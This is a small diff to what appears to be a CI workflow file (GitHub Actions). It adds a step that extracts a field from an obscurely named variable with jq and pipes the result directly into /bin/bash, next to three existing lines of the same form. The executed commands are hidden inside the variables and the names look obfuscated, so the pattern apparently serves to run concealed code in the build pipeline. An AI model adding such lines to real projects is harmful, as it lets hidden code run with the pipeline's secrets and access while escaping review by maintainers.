@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$npgf9748" | jq -r .mtfb092 | /bin/bash
           echo $fvn96087 | jq -r .xsu1325 | /bin/bash
           printf '%s' "$zayt52" | jq -r .ym329 | /bin/bash
+          echo $lhao9780 | jq -r .nygd00 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
